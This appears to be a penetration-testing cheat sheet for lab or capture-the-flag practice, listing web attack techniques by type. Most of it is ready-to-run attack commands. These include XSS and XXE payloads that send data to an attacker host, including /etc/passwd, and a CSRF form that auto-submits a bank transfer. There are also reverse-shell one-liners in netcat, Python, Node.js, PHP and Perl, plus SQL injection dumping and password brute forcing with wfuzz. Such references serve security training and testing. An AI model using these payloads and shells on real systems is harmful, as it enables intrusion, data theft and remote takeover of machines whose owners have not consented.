# Testing vulnerabilities 

## Serve files from Kali
1. Create folder `mkdir payloads`
2. Add files to folder that you want to serve to target machine 
3. `cd` to the created folder 
4. Execute command to start serving the files:
```shell
python3 -m http.server 80
```

## XSS (Cross-Site Scripting)

### Manual
```shell
<script>fetch("http://$KALIMASCHINE/insideScript")</script>
<script src="http://$KALIMASCHINE/srcScript"></script>
<img src='x' onerror="fetch('http://$KALIMASCHINE/img')">
```

### Fuzzing
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$IP/index.php?id=FUZZ"
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -d "username=FUZZ&password=test123" --hh 0 "$IP/login"
```

## CSRF (Cross-Site Request Forgery)
With XSS e.g. attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.
```shell
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="999999">
</form>

<script>
  document.forms[0].submit();
</script>
```

## SSRF (Server‑Side Request Forgery)
Force an application or server to request data or a resource, where a link can be set.
```shell
file:///tmp/foo.txt
file:///c:/windows/win.ini
gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
```

## SQLi (SQL Injection)

### Fuzzing GET parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$IP/index.php?id=FUZZ"
```

### Fuzzing POST parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$IP/index.php"
```

### sqlmap GET parameter
```shell
sqlmap -u "$IP/index.php?id=1"
```

### sqlmap POST parameter
Copy POST request from Burp Suite into `post.txt` file
```shell
sqlmap -r request.txt --batch --dump
```

## Directory Traversal

### Fuzzing LFI default file paths
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 --hc 500 "$IP/index.php?id=FUZZ"
```

### Fuzzing LFI app specific files
Create two wordlists:
1. Containing paths (paths.txt):
   ../
   ../../
   etc.
2. Containing custom files related to the web technology used (files.txt): 
   application.properties
   applitcation.yml
```shell
wfuzz -w paths.txt -w files.txt --hh 0 "$IP/index.php?id=FUZZFUZ2Z"
```

## XXE (XML External Entity)

### Fuzzing XXE 
Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`

### Out-of-Band Exploitation
1. Create file named xxe.dtd with content:
```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
```
2. Serve file with http 
3. Insert file in payload 
```xml
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://[kali-ip]/external.dtd"> 
%base;
%external;
%exfil;
]>
```
4. Check incoming requests 

Note that extracting file with multiple lines may not work due to encoding issues.

## SSTI (Server-side Template Injection)

### Discover SSTI 
```plaintext
{{7*7}}
${7*7}
#{"7"*7}
{{7*'7'}}
${dir()}
<%= 7 * 7 %>
```
with
```
{{7*7}} # if 49 => twig
${7*7} # if 49 => freemarker or jinja or mako
#{"7"*7} # if <49> => pug
{{7*'7'}} # if 77777777 => jinja or mako
${dir()} # if ['__M_caller', '__M_locals', '__M_writer', 'context', 'dir', 'pageargs'] => mako
<%= 7 * 7 %> # if 49 => EJS
```

## Command Injection 

### Fuzzing command injection 
```shell
wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$IP/index.php?parameter=idFUZZ"
```

### Setup reverse shell listener 
```shell
nc -nlvp 4242
```

### Reverse shell Netcat 
```shell
/bin/nc -nv [kali-ip] 4242 -e /bin/bash
```

### Reverse shell Python 
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[kali-ip]",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Reverse shell Node.js 
```shell
echo "require('child_process').exec('nc -nv [kali-ip] 4242 -e /bin/bash')" > /var/tmp/shell.js ; node /var/tmp/shell.js
```

### Reverse shell PHP
```php
php -r '$sock=fsockopen("[kali-ip]",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

### Reverse shell Perl
```shell
perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## IDOR (Insecure Direct Object Reference)

### Static file IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ.txt"
```

### ID based IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ"
```

## Brute forcing 

### Create wordlist

cewl $IP -w wordlist.txt

### Users discovery

```shell
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$IP/login.php?user=FUZZ"
```

### Password discovery
```shell
wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$IP/login.php"
```

### Double FUZZ
```shell
wfuzz -c -z file,user.txt -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hw 404 -d "username=FUZZ&password=FUZ2Z&submit=" "$IP/login.php"
```

## Locations proof.txt
/proof.txt
/var/tmp/proof.txt
/root/proof.txt
/app/proof.txt